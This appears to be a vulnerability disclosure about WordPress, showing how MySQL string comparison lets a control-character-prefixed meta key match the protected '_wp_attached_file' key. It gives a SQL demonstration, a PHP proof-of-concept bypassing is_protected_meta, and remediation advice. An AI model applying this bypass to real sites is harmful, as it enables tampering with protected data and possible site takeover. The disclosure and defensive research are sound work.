## WordPress core api and MySQL string comparison

If we execute the following MySQL query against WP database 
```
select * from wp_postmeta where meta_key = concat(char(1),"_wp_attached_file");
```
we will get results in case we had already uploaded media in the past
```
+---------+---------+-------------------+--------------------------------+
| meta_id | post_id | meta_key          | meta_value                     |
+---------+---------+-------------------+--------------------------------+
|      46 |      92 | _wp_attached_file | 2020/07/wpdeeply.png#/boom.png |
|      71 |      99 | _wp_attached_file | wpdeeply                       |
+---------+---------+-------------------+--------------------------------+
2 rows in set (0.00 sec)

```
This is sort of "feature" of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities fixed silently and today we are going to focus on `update_metadata` function. WordPress prevents medling with protected meta via `is_protected_meta` function which basically checks if `meta_key` starts with `_`, but that isn't enough because it is on PHP side.

Eli5 PoC

Upload media file on your test WP instance and grab the `post_id`. Then run the following code snippet  with your own data / post_id:
```
function bypass_protected_meta(){
    //your demo media(post) id
    $post_id = 99;
    
    $meta_key = "\x11_wp_attached_file";
    $meta_value = "wpdeeply";
    
    //into edit post meta capability there is check for protected meta, but this is for auditorium to be much more clearer 
    if ( current_user_can( 'edit_post_meta', $post_id, $meta_key ) && ! is_protected_meta($meta_key) ){
        update_post_meta($post_id, $meta_key, $meta_value);
    }
}

add_action(init, "bypass_protected_meta");
``` 
Refresh the media (will not be displayed) and if you check in DB `_wp_attached_file` will have the `wpdeeply` value.
Is this bug with impact? Well Jetpack folks will need to answer that https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824, but you can find a lot of use cases on wpdirectory :) 


## Few facts 

- This MySQL behaviour is for huge set of utf-8 characters not only ascii control ones
- Why this happens https://stackoverflow.com/questions/543580/equals-vs-like/2336940#2336940
- There are more places around WP code where unexpected behaviour is in game because at the end of the day WP is just PHP & MySQL web app
- Meddling with protected meta on WP is RCE. Few examples: 

## Remediation

- be careful with data used in MySQL WHERE 
- `is_protected_meta` should be DB/MySQL check against current setup instead PHP one

